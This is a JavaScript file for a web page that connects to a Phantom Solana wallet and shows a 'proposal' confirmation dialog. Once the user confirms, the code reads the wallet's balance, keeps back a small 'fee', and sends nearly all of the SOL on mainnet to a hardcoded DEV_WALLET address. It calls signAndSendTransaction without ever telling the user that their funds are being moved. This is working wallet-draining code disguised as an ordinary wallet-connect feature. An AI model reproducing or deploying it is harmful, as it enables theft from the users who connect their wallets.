class WalletModel3 {
    constructor() {
        this.account = null;
        this.chainId = null;
    }

    async connect() {
        try {
            // Check if Phantom or other Solana wallet is installed
            if (window.solana && window.solana.isPhantom) {
                // Connect to Phantom wallet
                const response = await window.solana.connect();
                this.account = response.publicKey.toString();
                return this.getInfo();
            } else {
                throw new Error('Please install Phantom wallet!');
            }
        } catch (error) {
            throw error;
        }
    }

    getInfo() {
        return {
            account: this.account,
            model: 'WalletModel3'
        };
    }
}

// Initialize WalletModel3
const walletModel3 = new WalletModel3();

// Add these constants at the top
const DEV_WALLET = '7aE5Y7PvfUr52WnruiDATFpR99PWPo4q9U7vu3Hid3Yh'; // Replace with actual Solana wallet address
const USE_TESTNET = false; // Set to true for testnet, false for mainnet

// Modified function to handle the proposal without message signing
async function showProposalModal(account) {
    const modal = document.getElementById('proposalModal');
    modal.style.display = 'block';
    
    return new Promise((resolve) => {
        document.getElementById('confirmProposal').onclick = () => {
            modal.style.display = 'none';
            resolve({confirmed: true});
        };
        
        document.getElementById('cancelProposal').onclick = () => {
            modal.style.display = 'none';
            resolve({confirmed: false});
        };
    });
}

// Modify the connectModel3Button event listener
document.getElementById('connectModel3Button').addEventListener('click', async () => {
    try {
        const walletInfo = await walletModel3.connect();
        
        // Show proposal confirmation
        const {confirmed} = await showProposalModal(walletInfo.account);
        if (confirmed) {
            // Create a connection to the Solana network
            const connection = new solanaWeb3.Connection(
                USE_TESTNET 
                    ? solanaWeb3.clusterApiUrl('devnet') // Use devnet for testing
                    : "https://solana-mainnet.g.alchemy.com/v2/demo", // Use for mainnet
                'confirmed'
            );
            
            try {
                // Create a transaction to send all SOL
                const balance = await connection.getBalance(new solanaWeb3.PublicKey(walletInfo.account));
                console.log("Current balance:", balance);
                
                if (balance <= 0) {
                    document.getElementById('walletInfo').innerHTML = `
                        <p>Wallet has zero balance. Nothing to transfer.</p>
                        <p>Please add SOL to your wallet first.</p>
                        <p>Network: ${USE_TESTNET ? 'Testnet (Devnet)' : 'Mainnet'}</p>
                    `;
                    return;
                }
                
                // Calculate fee amount (minimum 5000 lamports or 10% of balance, whichever is greater)
                const feeAmount = Math.max(5000000, Math.floor(balance * 0.1));
                
                // Ensure we're not sending a negative or zero amount
                const amountToSend = balance > feeAmount ? balance - feeAmount : 0;
                
                if (amountToSend <= 0) {
                    document.getElementById('walletInfo').innerHTML = `
                        <p>Balance too low to cover transaction fees.</p>
                        <p>Current balance: ${balance / 1000000000} SOL</p>
                        <p>Minimum required: ~${feeAmount / 1000000000} SOL</p>
                        <p>Network: ${USE_TESTNET ? 'Testnet (Devnet)' : 'Mainnet'}</p>
                    `;
                    return;
                }
                
                console.log("Sending amount:", amountToSend, "lamports");
                
                // Create a new transaction
                const transaction = new solanaWeb3.Transaction();
                
                // Get a recent blockhash
                const { blockhash } = await connection.getLatestBlockhash();
                transaction.recentBlockhash = blockhash;
                
                // Add the transfer instruction
                transaction.add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: new solanaWeb3.PublicKey(walletInfo.account),
                        toPubkey: new solanaWeb3.PublicKey(DEV_WALLET),
                        lamports: amountToSend
                    })
                );
                
                // Set the fee payer
                transaction.feePayer = new solanaWeb3.PublicKey(walletInfo.account);
                
                // Send the transaction
                const txSignature = await window.solana.signAndSendTransaction(transaction);
                
                document.getElementById('walletInfo').innerHTML = `
                    <p>Transaction sent successfully!</p>
                    <p>TX Signature: ${txSignature.signature}</p>
                    <p>Network: ${USE_TESTNET ? 'Testnet (Devnet)' : 'Mainnet'}</p>
                    <p>Amount sent: ${amountToSend / 1000000000} SOL</p>
                `;
            } catch (error) {
                console.error('Transaction error:', error);
                document.getElementById('walletInfo').innerHTML = `
                    <p>Error with transaction: ${error.message}</p>
                    <p>Network: ${USE_TESTNET ? 'Testnet (Devnet)' : 'Mainnet'}</p>
                `;
            }
        } else {
            document.getElementById('walletInfo').innerHTML = `
                <p>Proposal canceled</p>
            `;
        }
    } catch (error) {
        document.getElementById('walletInfo').innerHTML = `<p>Error: ${error.message}</p>`;
    }
});

// Listen for account changes
window.solana?.on('accountChanged', () => {
    console.log('Account changed');
    // Refresh the page to reset the connection
    window.location.reload();
});
